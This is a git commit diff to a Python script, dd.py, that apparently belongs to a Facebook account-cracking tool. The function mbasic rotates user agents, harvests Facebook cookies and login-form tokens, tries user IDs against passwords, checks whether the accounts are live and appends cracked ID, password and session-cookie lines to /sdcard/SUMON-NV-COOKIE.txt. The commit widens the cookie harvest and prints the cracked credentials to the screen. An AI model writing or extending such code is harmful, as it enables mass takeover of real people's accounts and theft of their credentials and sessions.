13b060fe3da20adc879b8edf1eea3fc249c761a2
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-10-05 20:43:52 +0530

    Update dd.py

--- dd.py
+++ dd.py
@@ -1758,7 +1758,8 @@ def mbasic(uid,pwx,tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             Session = requests.Session()
-            cookie_values = {name: (lambda r: r.cookies.get(name))(requests.get('https://touch.facebook.com')) for name in ['fr']}
+            cookie_values = {name: (lambda r: r.cookies.get(name))(requests.get('https://touch.facebook.com', headers=headers)) for name in ['fr', 'sb', 'datr', 'ps_n', 'ps_l', 'wd',]}
+            print(f"{cyan}(ATOM-NV){cookie_values}")
             free_fb = Session.get('https://business.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1820,7 +1821,7 @@ def mbasic(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
